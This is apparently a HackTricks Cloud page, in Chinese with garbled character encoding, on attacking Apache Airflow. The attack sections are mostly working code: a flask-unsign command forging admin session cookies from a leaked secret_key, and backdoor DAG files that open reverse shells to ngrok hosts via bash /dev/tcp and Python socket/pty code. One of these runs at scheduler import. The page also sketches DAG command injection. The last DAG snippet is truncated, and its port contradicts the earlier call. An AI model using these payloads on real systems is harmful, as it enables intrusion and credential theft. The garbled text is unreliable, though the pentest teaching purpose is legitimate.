# Apache Airflow Security

{% hint style="success" %}
å­¦ä¹ ä¸å®è·µ AWS é»‘å®¢æŠ€æœ¯ï¼š<img src="../../.gitbook/assets/image (1).png" alt="" data-size="line">[**HackTricks åŸ¹è®­ AWS çº¢é˜Ÿä¸“å®¶ (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="../../.gitbook/assets/image (1).png" alt="" data-size="line">\
å­¦ä¹ ä¸å®è·µ GCP é»‘å®¢æŠ€æœ¯ï¼š<img src="../../.gitbook/assets/image (2).png" alt="" data-size="line">[**HackTricks åŸ¹è®­ GCP çº¢é˜Ÿä¸“å®¶ (GRTE)**<img src="../../.gitbook/assets/image (2).png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>æ”¯æŒ HackTricks</summary>

* æŸ¥çœ‹ [**è®¢é˜…è®¡åˆ’**](https://github.com/sponsors/carlospolop)!
* **åŠ å…¥** ğŸ’¬ [**Discord ç¾¤ç»„**](https://discord.gg/hRep4RUj7f) æˆ– [**Telegram ç¾¤ç»„**](https://t.me/peass) æˆ– **å…³æ³¨** æˆ‘ä»¬çš„ **Twitter** ğŸ¦ [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
* **é€šè¿‡å‘** [**HackTricks**](https://github.com/carlospolop/hacktricks) å’Œ [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) GitHub ä»“åº“æäº¤ PR æ¥åˆ†äº«é»‘å®¢æŠ€å·§ã€‚

</details>
{% endhint %}

### åŸºæœ¬ä¿¡æ¯

[**Apache Airflow**](https://airflow.apache.org) ä½œä¸ºä¸€ä¸ª **ç¼–æ’å’Œè°ƒåº¦æ•°æ®ç®¡é“æˆ–å·¥ä½œæµ** çš„å¹³å°ã€‚åœ¨æ•°æ®ç®¡é“çš„ä¸Šä¸‹æ–‡ä¸­ï¼Œâ€œç¼–æ’â€ä¸€è¯è¡¨ç¤ºå®‰æ’ã€åè°ƒå’Œç®¡ç†æ¥è‡ªå„ç§æ¥æºçš„å¤æ‚æ•°æ®å·¥ä½œæµçš„è¿‡ç¨‹ã€‚è¿™äº›ç¼–æ’çš„æ•°æ®ç®¡é“çš„ä¸»è¦ç›®çš„æ˜¯æä¾›ç»è¿‡å¤„ç†å’Œå¯æ¶ˆè´¹çš„æ•°æ®é›†ã€‚è¿™äº›æ•°æ®é›†è¢«å¹¿æ³›åº”ç”¨äºä¼—å¤šåº”ç”¨ç¨‹åºï¼ŒåŒ…æ‹¬ä½†ä¸é™äºå•†ä¸šæ™ºèƒ½å·¥å…·ã€æ•°æ®ç§‘å­¦å’Œæœºå™¨å­¦ä¹ æ¨¡å‹ï¼Œæ‰€æœ‰è¿™äº›éƒ½æ˜¯å¤§æ•°æ®åº”ç”¨ç¨‹åºæ­£å¸¸è¿è¡Œçš„åŸºç¡€ã€‚

åŸºæœ¬ä¸Šï¼ŒApache Airflow å°†å…è®¸æ‚¨ **åœ¨æŸäº›äº‹æƒ…**ï¼ˆäº‹ä»¶ï¼Œcronï¼‰ **å‘ç”Ÿæ—¶è°ƒåº¦ä»£ç çš„æ‰§è¡Œ**ã€‚

### æœ¬åœ°å®éªŒå®¤

#### Docker-Compose

æ‚¨å¯ä»¥ä½¿ç”¨æ¥è‡ª [**https://raw.githubusercontent.com/apache/airflow/main/docs/apache-airflow/start/docker-compose.yaml**](https://raw.githubusercontent.com/apache/airflow/main/docs/apache-airflow/start/docker-compose.yaml) çš„ **docker-compose é…ç½®æ–‡ä»¶** å¯åŠ¨ä¸€ä¸ªå®Œæ•´çš„ Apache Airflow Docker ç¯å¢ƒã€‚ï¼ˆå¦‚æœæ‚¨åœ¨ MacOS ä¸Šï¼Œè¯·ç¡®ä¿ä¸º Docker è™šæ‹Ÿæœºåˆ†é…è‡³å°‘ 6GB çš„å†…å­˜ï¼‰ã€‚

#### Minikube

ä¸€ç§ç®€å•çš„æ–¹æ³•æ˜¯ **ä½¿ç”¨ minikube è¿è¡Œ apache airflow**ï¼š
```bash
helm repo add airflow-stable https://airflow-helm.github.io/charts
helm repo update
helm install airflow-release airflow-stable/airflow
# Some information about how to aceess the web console will appear after this command

# Use this command to delete it
helm delete airflow-release
```
### Airflow é…ç½®

Airflow å¯èƒ½åœ¨å…¶é…ç½®ä¸­å­˜å‚¨ **æ•æ„Ÿä¿¡æ¯**ï¼Œæˆ–è€…æ‚¨å¯èƒ½ä¼šå‘ç°å­˜åœ¨å¼±é…ç½®ï¼š

{% content-ref url="airflow-configuration.md" %}
[airflow-configuration.md](airflow-configuration.md)
{% endcontent-ref %}

### Airflow RBAC

åœ¨å¼€å§‹æ”»å‡» Airflow ä¹‹å‰ï¼Œæ‚¨åº”è¯¥äº†è§£ **æƒé™æ˜¯å¦‚ä½•å·¥ä½œçš„**ï¼š

{% content-ref url="airflow-rbac.md" %}
[airflow-rbac.md](airflow-rbac.md)
{% endcontent-ref %}

### æ”»å‡»

#### Web æ§åˆ¶å°æšä¸¾

å¦‚æœæ‚¨æœ‰ **è®¿é—® web æ§åˆ¶å°** çš„æƒé™ï¼Œæ‚¨å¯èƒ½èƒ½å¤Ÿè®¿é—®ä»¥ä¸‹ä¸€äº›æˆ–å…¨éƒ¨ä¿¡æ¯ï¼š

* **å˜é‡**ï¼ˆè‡ªå®šä¹‰æ•æ„Ÿä¿¡æ¯å¯èƒ½å­˜å‚¨åœ¨è¿™é‡Œï¼‰
* **è¿æ¥**ï¼ˆè‡ªå®šä¹‰æ•æ„Ÿä¿¡æ¯å¯èƒ½å­˜å‚¨åœ¨è¿™é‡Œï¼‰
* åœ¨ `http://<airflow>/connection/list/` ä¸­è®¿é—®å®ƒä»¬
* [**é…ç½®**](./#airflow-configuration)ï¼ˆæ•æ„Ÿä¿¡æ¯å¦‚ **`secret_key`** å’Œå¯†ç å¯èƒ½å­˜å‚¨åœ¨è¿™é‡Œï¼‰
* åˆ—å‡º **ç”¨æˆ·å’Œè§’è‰²**
* **æ¯ä¸ª DAG çš„ä»£ç **ï¼ˆå¯èƒ½åŒ…å«æœ‰è¶£çš„ä¿¡æ¯ï¼‰

#### æ£€ç´¢å˜é‡å€¼

å˜é‡å¯ä»¥å­˜å‚¨åœ¨ Airflow ä¸­ï¼Œä»¥ä¾¿ **DAG** å¯ä»¥ **è®¿é—®** å…¶å€¼ã€‚è¿™ç±»ä¼¼äºå…¶ä»–å¹³å°çš„ç§˜å¯†ã€‚å¦‚æœæ‚¨æœ‰ **è¶³å¤Ÿçš„æƒé™**ï¼Œå¯ä»¥åœ¨ GUI ä¸­è®¿é—®å®ƒä»¬ï¼Œåœ°å€ä¸º `http://<airflow>/variable/list/`ã€‚\
Airflow é»˜è®¤ä¼šåœ¨ GUI ä¸­æ˜¾ç¤ºå˜é‡çš„å€¼ï¼Œä½†æ ¹æ® [**è¿™ä¸ª**](https://marclamberti.com/blog/variables-with-apache-airflow/) çš„è¯´æ³•ï¼Œå¯ä»¥è®¾ç½®ä¸€ä¸ª **å˜é‡åˆ—è¡¨**ï¼Œå…¶ **å€¼** å°†åœ¨ **GUI** ä¸­æ˜¾ç¤ºä¸º **æ˜Ÿå·**ã€‚

![](<../../.gitbook/assets/image (164).png>)

ç„¶è€Œï¼Œè¿™äº› **å€¼** ä»ç„¶å¯ä»¥é€šè¿‡ **CLI**ï¼ˆæ‚¨éœ€è¦æœ‰æ•°æ®åº“è®¿é—®æƒé™ï¼‰ã€**ä»»æ„ DAG** æ‰§è¡Œã€**API** è®¿é—®å˜é‡ç«¯ç‚¹ï¼ˆéœ€è¦æ¿€æ´» APIï¼‰ï¼Œç”šè‡³ **GUI æœ¬èº«** æ¥ **æ£€ç´¢**ï¼\
è¦ä» GUI è®¿é—®è¿™äº›å€¼ï¼Œåªéœ€ **é€‰æ‹©æ‚¨æƒ³è®¿é—®çš„å˜é‡**ï¼Œç„¶å **ç‚¹å‡»æ“ä½œ -> å¯¼å‡º**ã€‚\
å¦ä¸€ç§æ–¹æ³•æ˜¯å¯¹ **éšè—å€¼** è¿›è¡Œ **æš´åŠ›ç ´è§£**ï¼Œä½¿ç”¨ **æœç´¢è¿‡æ»¤** ç›´åˆ°è·å–åˆ°å®ƒï¼š

![](<../../.gitbook/assets/image (152).png>)

#### æƒé™æå‡

å¦‚æœ **`expose_config`** é…ç½®è®¾ç½®ä¸º **True**ï¼Œåˆ™ä» **ç”¨æˆ·è§’è‰²** åŠ **ä»¥ä¸Š** å¯ä»¥ **è¯»å–** **web ä¸­çš„é…ç½®**ã€‚åœ¨æ­¤é…ç½®ä¸­ï¼Œ**`secret_key`** å‡ºç°ï¼Œè¿™æ„å‘³ç€ä»»ä½•æ‹¥æœ‰æ­¤æœ‰æ•ˆå¯†é’¥çš„ç”¨æˆ·éƒ½å¯ä»¥ **åˆ›å»ºè‡ªå·±çš„ç­¾å cookie æ¥å†’å……ä»»ä½•å…¶ä»–ç”¨æˆ·è´¦æˆ·**ã€‚
```bash
flask-unsign --sign --secret '<secret_key>' --cookie "{'_fresh': True, '_id': '12345581593cf26619776d0a1e430c412171f4d12a58d30bef3b2dd379fc8b3715f2bd526eb00497fcad5e270370d269289b65720f5b30a39e5598dad6412345', '_permanent': True, 'csrf_token': '09dd9e7212e6874b104aad957bbf8072616b8fbc', 'dag_status_filter': 'all', 'locale': 'en', 'user_id': '1'}"
```
#### DAG åé—¨ (Airflow worker ä¸­çš„ RCE)

å¦‚æœæ‚¨å¯¹ **DAG ä¿å­˜çš„ä½ç½®** æœ‰ **å†™å…¥æƒé™**ï¼Œæ‚¨å¯ä»¥ **åˆ›å»ºä¸€ä¸ª** å‘é€ **åå‘ shell** çš„ **DAG**ã€‚\
è¯·æ³¨æ„ï¼Œè¿™ä¸ªåå‘ shell å°†åœ¨ **airflow worker å®¹å™¨** å†…æ‰§è¡Œï¼š
```python
import pendulum
from airflow import DAG
from airflow.operators.bash import BashOperator

with DAG(
dag_id='rev_shell_bash',
schedule_interval='0 0 * * *',
start_date=pendulum.datetime(2021, 1, 1, tz="UTC"),
) as dag:
run = BashOperator(
task_id='run',
bash_command='bash -i >& /dev/tcp/8.tcp.ngrok.io/11433  0>&1',
)
```

```python
import pendulum, socket, os, pty
from airflow import DAG
from airflow.operators.python import PythonOperator

def rs(rhost, port):
s = socket.socket()
s.connect((rhost, port))
[os.dup2(s.fileno(),fd) for fd in (0,1,2)]
pty.spawn("/bin/sh")

with DAG(
dag_id='rev_shell_python',
schedule_interval='0 0 * * *',
start_date=pendulum.datetime(2021, 1, 1, tz="UTC"),
) as dag:
run = PythonOperator(
task_id='rs_python',
python_callable=rs,
op_kwargs={"rhost":"8.tcp.ngrok.io", "port": 11433}
)
```
#### DAG åé—¨ (Airflow è°ƒåº¦å™¨ä¸­çš„ RCE)

å¦‚æœæ‚¨å°†æŸäº›å†…å®¹è®¾ç½®ä¸º**åœ¨ä»£ç çš„æ ¹ç›®å½•ä¸­æ‰§è¡Œ**ï¼Œåœ¨æ’°å†™æœ¬æ–‡æ—¶ï¼Œå®ƒå°†åœ¨å°†å…¶æ”¾å…¥ DAG æ–‡ä»¶å¤¹åå‡ ç§’é’Ÿå†…**ç”±è°ƒåº¦å™¨æ‰§è¡Œ**ã€‚
```python
import pendulum, socket, os, pty
from airflow import DAG
from airflow.operators.python import PythonOperator

def rs(rhost, port):
s = socket.socket()
s.connect((rhost, port))
[os.dup2(s.fileno(),fd) for fd in (0,1,2)]
pty.spawn("/bin/sh")

rs("2.tcp.ngrok.io", 14403)

with DAG(
dag_id='rev_shell_python2',
schedule_interval='0 0 * * *',
start_date=pendulum.datetime(2021, 1, 1, tz="UTC"),
) as dag:
run = PythonOperator(
task_id='rs_python2',
python_callable=rs,
op_kwargs={"rhost":"2.tcp.ngrok.io", "port": 144}
```
#### DAG åˆ›å»º

å¦‚æœä½ æˆåŠŸ**æ”»é™·äº† DAG é›†ç¾¤ä¸­çš„ä¸€å°æœºå™¨**ï¼Œä½ å¯ä»¥åœ¨ `dags/` æ–‡ä»¶å¤¹ä¸­åˆ›å»ºæ–°çš„ **DAG è„šæœ¬**ï¼Œå®ƒä»¬å°†ä¼šåœ¨ DAG é›†ç¾¤ä¸­çš„å…¶ä½™æœºå™¨ä¸Š**å¤åˆ¶**ã€‚

#### DAG ä»£ç æ³¨å…¥

å½“ä½ ä» GUI æ‰§è¡Œä¸€ä¸ª DAG æ—¶ï¼Œä½ å¯ä»¥**ä¼ é€’å‚æ•°**ç»™å®ƒã€‚\
å› æ­¤ï¼Œå¦‚æœ DAG ç¼–å†™ä¸å½“ï¼Œå®ƒå¯èƒ½ä¼š**å®¹æ˜“å—åˆ°å‘½ä»¤æ³¨å…¥çš„æ”»å‡»ã€‚**\
è¿™å°±æ˜¯åœ¨è¿™ä¸ª CVE ä¸­å‘ç”Ÿçš„æƒ…å†µ: [https://www.exploit-db.com/exploits/49927](https://www.exploit-db.com/exploits/49927)

ä½ éœ€è¦çŸ¥é“çš„**å¼€å§‹å¯»æ‰¾ DAG ä¸­å‘½ä»¤æ³¨å…¥çš„æ–¹æ³•**æ˜¯**å‚æ•°**æ˜¯é€šè¿‡ä»£ç **`dag_run.conf.get("param_name")`**æ¥**è®¿é—®**çš„ã€‚

æ­¤å¤–ï¼Œ**å˜é‡**ä¹Ÿå¯èƒ½å‡ºç°ç›¸åŒçš„æ¼æ´ï¼ˆè¯·æ³¨æ„ï¼Œæ‹¥æœ‰è¶³å¤Ÿæƒé™çš„æƒ…å†µä¸‹ï¼Œä½ å¯ä»¥åœ¨ GUI ä¸­**æ§åˆ¶å˜é‡çš„å€¼**ï¼‰ã€‚å˜é‡é€šè¿‡ä»¥ä¸‹æ–¹å¼**è®¿é—®**:
```python
from airflow.models import Variable
[...]
foo = Variable.get("foo")
```
å¦‚æœå®ƒä»¬è¢«ç”¨åœ¨ä¾‹å¦‚ bash å‘½ä»¤ä¸­ï¼Œä½ å¯èƒ½ä¼šæ‰§è¡Œå‘½ä»¤æ³¨å…¥ã€‚

{% hint style="success" %}
å­¦ä¹ ä¸å®è·µ AWS é»‘å®¢æŠ€æœ¯ï¼š<img src="../../.gitbook/assets/image (1).png" alt="" data-size="line">[**HackTricks åŸ¹è®­ AWS çº¢é˜Ÿä¸“å®¶ (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="../../.gitbook/assets/image (1).png" alt="" data-size="line">\
å­¦ä¹ ä¸å®è·µ GCP é»‘å®¢æŠ€æœ¯ï¼š<img src="../../.gitbook/assets/image (2).png" alt="" data-size="line">[**HackTricks åŸ¹è®­ GCP çº¢é˜Ÿä¸“å®¶ (GRTE)**<img src="../../.gitbook/assets/image (2).png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>æ”¯æŒ HackTricks</summary>

* æŸ¥çœ‹ [**è®¢é˜…è®¡åˆ’**](https://github.com/sponsors/carlospolop)!
* **åŠ å…¥** ğŸ’¬ [**Discord ç¾¤ç»„**](https://discord.gg/hRep4RUj7f) æˆ– [**Telegram ç¾¤ç»„**](https://t.me/peass) æˆ– **å…³æ³¨** æˆ‘ä»¬çš„ **Twitter** ğŸ¦ [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
* **é€šè¿‡å‘** [**HackTricks**](https://github.com/carlospolop/hacktricks) å’Œ [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) GitHub ä»“åº“æäº¤ PR æ¥åˆ†äº«é»‘å®¢æŠ€å·§ã€‚

</details>
{% endhint %}
